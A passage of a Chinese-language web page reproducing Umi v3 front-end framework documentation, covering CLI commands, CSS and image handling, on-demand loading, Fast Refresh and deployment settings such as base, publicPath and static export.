&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意：如果 <code>public</code> 里面存在产物同名文件，如 <code>index.html</code>，将会导致产物文件被覆盖。</p></blockquote><h3 id="umi-dev"><a href="#umi-dev" class="headerlink" title="umi dev"></a>umi dev</h3><p>启动本地开发服务器进行项目的开发调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi dev<br></code></pre></td></tr></table></figure><p>启动在浏览器中运行的开发服务器，并监视源文件变化，自动热加载。</p><p>默认使用 <code>8000</code> 端口，如果 <code>8000</code> 端口被占用，将会使用 <code>8001</code> 端口，以此类推。 你可以通过设置环境变量 <code>PORT</code> 来指定开发端口号。更多环境变量配置，请查阅<a href="https://v3.umijs.org/docs/env-variables">环境变量</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">umi devStarting the development server...<br>✔ Webpack  Compiled successfully <span class="hljs-keyword">in</span> 2.27s<br>  DONE  Compiled successfully <span class="hljs-keyword">in</span> 2276ms<br>  App running at:  - Local:   http://localhost:8000 (copied to clipboard)  - Network: http://192.168.50.236:8000<br></code></pre></td></tr></table></figure><p>开启开发服务还会同时提供一个 Network 的链接，你可以在能访问到你当前运行设备的其他设备中预览页面。</p><blockquote><p>注意：如果是在开启了VPN，或者虚拟机等复杂的网络环境中，这个地址很可能会错误。你可以通过访问你真实可用 <code>ip</code> 的对应端口号来访问开发页面。</p></blockquote><h3 id="umi-generate"><a href="#umi-generate" class="headerlink" title="umi generate"></a>umi generate</h3><p>内置的生成器功能，内置的类型有 <code>page</code> ，用于生成最简页面。支持别名调用 <code>umi g</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi generate &lt;<span class="hljs-built_in">type</span>&gt; &lt;name&gt; [options]<br></code></pre></td></tr></table></figure><p>这个命令支持扩展，通过 <code>api.registerGenerator</code> 注册，你可以通过插件来实现自己常用的生成器。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Generator</span>, <span class="hljs-title class_">IApi</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;umi&#x27;</span>;<br><span class="hljs-keyword">const</span> createPagesGenerator = <span class="hljs-keyword">function</span> (<span class="hljs-params">&#123; api &#125;: &#123; api: IApi &#125;</span>) &#123;  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageGenerator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Generator</span> &#123;    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">opts: <span class="hljs-built_in">any</span></span>) &#123;      <span class="hljs-variable language_">super</span>(opts);    &#125;    <span class="hljs-keyword">async</span> <span class="hljs-title function_">writing</span>(<span class="hljs-params"></span>) &#123;&#125;  &#125;;&#125;<br>api.<span class="hljs-title function_">registerGenerator</span>(&#123;  <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;pages&#x27;</span>,  <span class="hljs-title class_">Generator</span>: <span class="hljs-title function_">createPageGenerator</span>(&#123; api &#125;),&#125;);<br>umi generate page pageName<br>umi generate page pageName --typescript<br>umi generate page pageName --less<br></code></pre></td></tr></table></figure><p>更多使用类型和参数，请查阅提供生成器扩展的插件的文档。</p><h3 id="umi-plugin"><a href="#umi-plugin" class="headerlink" title="umi plugin"></a>umi plugin</h3><p>快速查看当前项目使用到的所有的 <code>umi</code> 插件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi plugin &lt;<span class="hljs-built_in">type</span>&gt; [options]<br></code></pre></td></tr></table></figure><p>当前支持的 <code>type</code> 是 <code>list</code>，可选参数 <code>key</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi plugin list<br>Plugins:<br>  - @umijs/preset-built-in (preset)  - ./node_modules/umi/lib/plugins/umiAlias<br>✨  Done <span class="hljs-keyword">in</span> 2.27s.<br>$ umi plugin list --key<br>Plugins:<br>  - @umijs/preset-built-in [key: builtIn]  (preset)  - ./node_modules/umi/lib/plugins/umiAlias  [key: builtIn]<br>✨  Done <span class="hljs-keyword">in</span> 2.27s.<br></code></pre></td></tr></table></figure><h3 id="umi-help"><a href="#umi-help" class="headerlink" title="umi help"></a>umi help</h3><p>umi 命令行的简易帮助文档。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi <span class="hljs-built_in">help</span> &lt;<span class="hljs-built_in">command</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="umi-version"><a href="#umi-version" class="headerlink" title="umi version"></a>umi version</h3><p>查看当前使用的 umi 的版本号，可以使用别名 <code>-v</code> 调用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi version<br>$ umi -v<br></code></pre></td></tr></table></figure><h3 id="umi-webpack"><a href="#umi-webpack" class="headerlink" title="umi webpack"></a>umi webpack</h3><p>查看 umi 使用的 webpack 配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi webpack [options]<br></code></pre></td></tr></table></figure><p>参数，</p><table><thead><tr><th>可选参数</th><th>说明</th></tr></thead><tbody><tr><td>rules</td><td>查看 webpack.module.rules 配置详情</td></tr><tr><td>rule&#x3D;[name]</td><td>查看 webpack.module.rules 中某个规则的配置详情</td></tr><tr><td>plugins</td><td>查看 webpack.plugins 配置详情</td></tr><tr><td>plugin&#x3D;[name]</td><td>查看 webpack.plugins 中某个插件的配置详情</td></tr></tbody></table><p>示例，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi webpack<br>&#123;  mode: <span class="hljs-string">&#x27;development&#x27;</span>,  devtool: <span class="hljs-string">&#x27;cheap-module-source-map&#x27;</span>,  node:&#123; &#125;,  output:&#123; &#125;,  resolve:&#123; &#125;,  module:&#123;    rules:[ ]  &#125;,  plugins:[ ],  entry:&#123; &#125;&#125;<br>$ umi webpack --rules<br>[  <span class="hljs-string">&#x27;js&#x27;</span>,  <span class="hljs-string">&#x27;ts-in-node_modules&#x27;</span>,  <span class="hljs-string">&#x27;js-in-node_modules&#x27;</span>,  <span class="hljs-string">&#x27;images&#x27;</span>,  <span class="hljs-string">&#x27;svg&#x27;</span>,  <span class="hljs-string">&#x27;fonts&#x27;</span>,  <span class="hljs-string">&#x27;plaintext&#x27;</span>,  <span class="hljs-string">&#x27;css&#x27;</span>,  <span class="hljs-string">&#x27;less&#x27;</span>]<br>$ umi webpack --rule=js<br>&#123;  <span class="hljs-built_in">test</span>: /\.(js|mjs|jsx|ts|tsx)$/,  include: [ <span class="hljs-string">&#x27;xx/umi&#x27;</span> ],  exclude: [ /node_modules/ ],  use:[    &#123;      loader:<span class="hljs-string">&#x27;xx/babel-loader/lib/index.js&#x27;</span>,      options: &#123;        sourceType: <span class="hljs-string">&#x27;unambiguous&#x27;</span>      &#125;    &#125;  ]&#125;<br>$ umi webpack --plugins<br>[  <span class="hljs-string">&#x27;extract-css&#x27;</span>,  <span class="hljs-string">&#x27;define&#x27;</span>,  <span class="hljs-string">&#x27;progress&#x27;</span>,  <span class="hljs-string">&#x27;copy&#x27;</span>,  <span class="hljs-string">&#x27;friendly-error&#x27;</span>,  <span class="hljs-string">&#x27;hmr&#x27;</span>]<br>$ umi webpack --plugin=extract-css<br>MiniCssExtractPlugin &#123;  options:&#123;    filename: <span class="hljs-string">&#x27;[name].css&#x27;</span>,    moduleFilename: [Function: moduleFilename],    ignoreOrder: <span class="hljs-literal">true</span>,    chunkFilename: <span class="hljs-string">&#x27;[name].chunk.css&#x27;</span>  &#125;&#125;<br></code></pre></td></tr></table></figure><p>默认会打印 development 的配置，如需查看 production 配置，需要指定环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ NODE_ENV=production umi webpack<br>&#123;  mode: <span class="hljs-string">&#x27;production&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="使用-CSS"><a href="#使用-CSS" class="headerlink" title="使用 CSS"></a>使用 CSS</h2><blockquote><p>本文档以 css 为示例，把后缀换成 <code>.less</code> 同样适用。</p></blockquote><h3 id="全局样式"><a href="#全局样式" class="headerlink" title="全局样式"></a>全局样式</h3><p>Umi 中约定 <code>src/global.css</code> 为全局样式，如果存在此文件，会被自动引入到入口文件最前面。</p><p>比如用于覆盖样式，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.ant-select-selection</span> &#123;<br>  <span class="hljs-attribute">max-height</span>: <span class="hljs-number">51px</span>;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS-Modules"><a href="#CSS-Modules" class="headerlink" title="CSS Modules"></a>CSS Modules</h3><p>Umi 会自动识别 CSS Modules 的使用，你把他当做 CSS Modules 用时才是 CSS Modules。</p><p>比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// CSS Modulesimport styles from &#x27;./foo.css&#x27;;</span><br><span class="hljs-comment">// 非 CSS Modulesimport &#x27;./foo.css&#x27;;</span><br></code></pre></td></tr></table></figure><h3 id="CSS-预处理器"><a href="#CSS-预处理器" class="headerlink" title="CSS 预处理器"></a>CSS 预处理器</h3><p>Umi 内置支持 less，不支持 sass 和 stylus，但如果有需求，可以通过 chainWebpack 配置或者 umi 插件的形式支持。</p><h3 id="CSS-中引入三方库"><a href="#CSS-中引入三方库" class="headerlink" title="CSS 中引入三方库"></a>CSS 中引入三方库</h3><p>TODO：别名的使用。</p><h2 id="使用图片"><a href="#使用图片" class="headerlink" title="使用图片"></a>使用图片</h2><h3 id="JS-里使用图片"><a href="#JS-里使用图片" class="headerlink" title="JS 里使用图片"></a>JS 里使用图片</h3><p>通过 require 引用相对路径的图片。</p><p>比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;require(</span>&#x27;<span class="hljs-attr">.</span>/<span class="hljs-attr">foo.png</span>&#x27;)&#125; /&gt;</span></span><br></code></pre></td></tr></table></figure><p>支持别名，比如通过 <code>@</code> 指向 src 目录：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;require(</span>&#x27;@/<span class="hljs-attr">foo.png</span>&#x27;)&#125; /&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="JS-里使用svg"><a href="#JS-里使用svg" class="headerlink" title="JS 里使用svg"></a>JS 里使用svg</h3><p><strong>组件式引入</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">ReactComponent</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">Logo</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./logo.svg&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Analysis</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Logo</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#123;90&#125;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&#123;120&#125;</span> /&gt;</span></span>&#125;<br></code></pre></td></tr></table></figure><p><strong>url式引入</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> logoSrc <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./logo.svg&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Analysis</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;logoSrc&#125;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;logo&quot;</span> /&gt;</span></span>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS-里使用图片"><a href="#CSS-里使用图片" class="headerlink" title="CSS 里使用图片"></a>CSS 里使用图片</h3><p>通过相对路径引用。</p><p>比如，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.logo</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">./foo.png</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>CSS 里也支持别名，但需要在前面加 <code>~</code> 前缀，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.logo</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">~@/foo.png</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li>这是 webpack 的规则，如果切到其他打包工具，可能会有变化</li><li>less 中同样适用</li></ol><h3 id="图片路径问题"><a href="#图片路径问题" class="headerlink" title="图片路径问题"></a>图片路径问题</h3><p>项目中使用图片有两种方式，</p><ol><li>先把图片传到 cdn，然后在 JS 和 CSS 中使用图片的绝对路径</li><li>把图片放在项目里，然后在 JS 和 CSS 中通过相对路径的方式使用</li></ol><p>前者不会有任何问题；后者，如果在 JS 中引用相对路径的图片时，在发布时会根据 publicPath 引入绝对路径，所以就算没有开启 dynamicImport 时，也需要注意 publicPath 的正确性。</p><h3 id="Base64-编译"><a href="#Base64-编译" class="headerlink" title="Base64 编译"></a>Base64 编译</h3><p>通过相对路径引入图片的时候，如果图片小于 10K，会被编译为 Base64，否则会被构建为独立的图片文件。</p><p>10K 这个阈值可以通过 <a href="https://v3.umijs.org/zh-CN/config#inlinelimit">inlineLimit 配置</a>修改。</p><h3 id="使用-CDN"><a href="#使用-CDN" class="headerlink" title="使用 CDN"></a>使用 CDN</h3><p>TODO</p><h2 id="按需加载"><a href="#按需加载" class="headerlink" title="按需加载"></a>按需加载</h2><h3 id="启用按需加载"><a href="#启用按需加载" class="headerlink" title="启用按需加载"></a>启用按需加载</h3><p><strong>常见使用场景</strong>：组件体积太大，不适合直接计入 bundle 中，以免影响首屏加载速度。例如：某组件 HugeA 包含巨大的实现 &#x2F; 依赖了巨大的三方库，且该组件 HugeA 的使用不在首屏显示范围内，可被单独拆出。这时候，<code>dynamic</code> 就该上场了。</p><p>为了简化部署成本，按需加载功能默认是关闭的，你需要在使用之前先通过配置开启，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">dynamicImport</span>: &#123;&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用按需加载"><a href="#使用按需加载" class="headerlink" title="使用按需加载"></a>使用按需加载</h3><h4 id="按需加载组件-dynamic"><a href="#按需加载组件-dynamic" class="headerlink" title="按需加载组件 dynamic"></a>按需加载组件 <code>dynamic</code></h4><p>**为什么使用 <code>dynamic</code>**：封装了使用一个异步组件需要做的状态维护工作，开发者可以更专注于自己的业务组件开发，而不必关心 code spliting、async module loading 等等技术细节。</p><p>通常搭配 <a href="https://github.com/tc39/proposal-dynamic-import">动态 import 语法</a> 使用。</p><p><strong>封装一个异步组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; dynamic &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;umi&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">dynamic</span>(&#123;  <span class="hljs-attr">loader</span>: <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;    <span class="hljs-comment">// 这里的注释 webpackChunkName 可以指导 webpack 将该组件 HugeA 以这个名字单独拆出去    const &#123; default: HugeA &#125; = await import(/* webpackChunkName: &quot;external_A&quot; */ &#x27;./HugeA&#x27;);    return HugeA;  &#125;,&#125;);</span><br></code></pre></td></tr></table></figure><p><strong>使用异步组件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<span class="hljs-keyword">import</span> <span class="hljs-title class_">AsyncHugeA</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./AsyncHugeA&#x27;</span>;<br><span class="hljs-comment">// 像使用普通组件一样即可// dynamic 为你做:// 1. 异步加载该模块的 bundle// 2. 加载期间 显示 loading（可定制）// 3. 异步组件加载完毕后，显示异步组件export default () =&gt; &#123;  return &lt;AsyncHugeA /&gt;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="快速刷新（Fast-Refresh）"><a href="#快速刷新（Fast-Refresh）" class="headerlink" title="快速刷新（Fast Refresh）"></a>快速刷新（Fast Refresh）</h2><blockquote><p>快速刷新（Fast Refresh）是 React 官方为 React Native 开发的模块热替换（HMR）方案，由于其核心实现与平台无关，同时也适用于 Web。</p></blockquote><p>Fast Refresh 功能最大的特性是：开发环境下，可以<strong>保持组件状态</strong>，同时编辑提供<strong>即时反馈</strong>。</p><h3 id="怎样使用？"><a href="#怎样使用？" class="headerlink" title="怎样使用？"></a>怎样使用？</h3><p>在<a href="https://v3.umijs.org/zh-CN/docs/config">配置文件</a>加上 <code>fastRefresh: &#123;&#125;</code> 即可开启</p><p>这张 gif 动图展示的是使用 Fast Refresh 特性的开发体验，可以看出，修改组件代码后，用户名和密码<strong>状态保持</strong>，这将提升应用本地研发体验。</p><p><img src="https://gw.alipayobjects.com/zos/antfincdn/B2biHHW6s%24/fast-refresh.gif" alt="img"></p><p>开发方式上与平时没有区别，正常地修改、保存、预览，只是在效果反馈上，体验更加好。</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>有些情况下，维持状态并不是预期，所以为了可靠起见，Fast Refresh 遇到以下情况一概不保留状态（remount）：</p><ul><li>Class 类组件一律重刷（remount），状态会被重置，包括高阶组件返回的 Class 组件</li><li>不纯组件模块，所编辑的模块除导出 React 组件外，还导出了其它模块</li><li>特殊的，还可以通过 <code>// @refresh reset</code> 指令（在源码文件中任意位置加上这行注释）强制重刷（remount），最大限度地保证可用性</li></ul><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>推荐写函数命名组件，例如：</p><p>✅ Good:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Foo</span> = (<span class="hljs-params"></span>) =&gt; &#123;&#125;;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Foo</span>;<br></code></pre></td></tr></table></figure><p>❌ Bad:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; &#123;&#125;;<br></code></pre></td></tr></table></figure><h3 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h3><h4 id="TypeError-Cannot-read-property-‘forEach’-of-undefined"><a href="#TypeError-Cannot-read-property-‘forEach’-of-undefined" class="headerlink" title="TypeError: Cannot read property ‘forEach’ of undefined"></a>TypeError: Cannot read property ‘forEach’ of undefined</h4><p>请检查浏览器扩展 React DevTools 的版本，是否小于 v4，请升级至 v4 版本可解决。<a href="https://github.com/umijs/umi/issues/6432">issue#6432</a></p><h2 id="部署-1"><a href="#部署-1" class="headerlink" title="部署"></a>部署</h2><h3 id="默认方案"><a href="#默认方案" class="headerlink" title="默认方案"></a>默认方案</h3><p>Umi 默认对新手友好，所以默认不做按需加载处理，<code>umi build</code> 后输出 <code>index.html</code>、<code>umi.js</code> 和 <code>umi.css</code> 三个文件。</p><h3 id="不输出-html-文件"><a href="#不输出-html-文件" class="headerlink" title="不输出 html 文件"></a>不输出 html 文件</h3><p>某些场景 html 文件交给后端输出，前端构建并不需要输出 html 文件，可配置环境变量 <code>HTML=none</code> 实现。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ HTML=none umi build<br></code></pre></td></tr></table></figure><h3 id="部署-html-到非根目录"><a href="#部署-html-到非根目录" class="headerlink" title="部署 html 到非根目录"></a>部署 html 到非根目录</h3><p>经常有同学问这个问题：</p><blockquote><p>为什么我本地开发是好的，部署后就没反应了，而且没有报错？</p></blockquote><p><strong>没有报错！</strong> 这是应用部署在非根路径的典型现象。为啥会有这个问题？因为路由没有匹配上，比如你把应用部署在 <code>/xxx/</code> 下，然后访问 <code>/xxx/hello</code>，而代码里匹配的是 <code>/hello</code>，那就匹配不上了，而又没有定义 fallback 的路由，比如 404，那就会显示空白页。</p><p>怎么解决？</p><p>可通过配置 <a href="https://v3.umijs.org/zh-CN/config#base">base</a> 解决。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> default &#123;<br>  base: <span class="hljs-string">&#x27;/path/to/your/app/root&#x27;</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="使用-hash-history"><a href="#使用-hash-history" class="headerlink" title="使用 hash history"></a>使用 hash history</h3><p>可通过配置 <a href="https://v3.umijs.org/zh-CN/config#history">history</a> 为 <code>hash</code> 为解决。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> default &#123;<br>  <span class="hljs-built_in">history</span>: &#123; <span class="hljs-built_in">type</span>: <span class="hljs-string">&#x27;hash&#x27;</span> &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="按需加载-1"><a href="#按需加载-1" class="headerlink" title="按需加载"></a>按需加载</h3><p>要实现按需加载，需配置 <a href="https://v3.umijs.org/zh-CN/config#dynamicimport">dynamicImport</a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">dynamicImport</span>: &#123;&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="静态资源在非根目录或-cdn"><a href="#静态资源在非根目录或-cdn" class="headerlink" title="静态资源在非根目录或 cdn"></a>静态资源在非根目录或 cdn</h3><p>这时，就需要配置 <a href="https://v3.umijs.org/zh-CN/config#publicpath">publicPath</a>。至于 publicPath 是啥？具体看 <a href="https://webpack.js.org/configuration/output/#output-publicpath">webpack 文档</a>，把他指向静态资源（js、css、图片、字体等）所在的路径。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">publicPath</span>: <span class="hljs-string">&quot;http://yourcdn/path/to/static/&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用-runtime-的-publicPath"><a href="#使用-runtime-的-publicPath" class="headerlink" title="使用 runtime 的 publicPath"></a>使用 runtime 的 publicPath</h3><p>对于需要在 html 里管理 publicPath 的场景，比如在 html 里判断环境做不同的输出，可通过配置 <a href="https://v3.umijs.org/zh-CN/config/#runtimepublicpath">runtimePublicPath</a> 为解决。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">runtimePublicPath</span>: <span class="hljs-literal">true</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><p>然后在 html 里输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">publicPath</span> = &lt;%= <span class="hljs-variable constant_">YOUR</span> <span class="hljs-variable constant_">PUBLIC_PATH</span> %&gt;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="静态化"><a href="#静态化" class="headerlink" title="静态化"></a>静态化</h3><p>在一些场景中，无法做服务端的 html fallback，即让每个路由都输出 index.html 的内容，那么就要做静态化。</p><p>比如上面的例子，我们在 .umirc.js 里配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">exportStatic</span>: &#123;&#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>然后执行 umi build，会为每个路由输出一个 html 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs unknown">./dist<br>├── index.html<br>├── list<br>│   └── index.html<br>└── static<br>    ├── pages__index.5c0f5f51.async.js<br>    ├── pages__list.f940b099.async.js<br>    ├── umi.2eaebd79.js<br>    └── umi.f4cb51da.css<br></code></pre></td></tr></table></figure><blockquote><p>注意：静态化暂不支持有变量路由的场景。</p></blockquote><h3 id="HTML-后缀"><a href="#HTML-后缀" class="headerlink" title="HTML 后缀"></a>HTML 后缀</h3><p>有些静态化的场景里，是不会自动读索引文件的，比如支付宝的容器环境，那么就不能生成这种 html 文件，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs unknown">├── index.html<br>├── list<br>│   └── index.html<br></code></pre></td></tr></table></figure><p>而是生成，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs unknown">├── index.html<br>└── list.html<br></code></pre></td></tr></table></figure><p>配置方式是在 .umirc.js 里，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">exportStatic</span>: &#123;<br>    <span class="hljs-attr">htmlSuffix</span>: <span class="hljs-literal">true</span>,<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>umi build 会生成，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 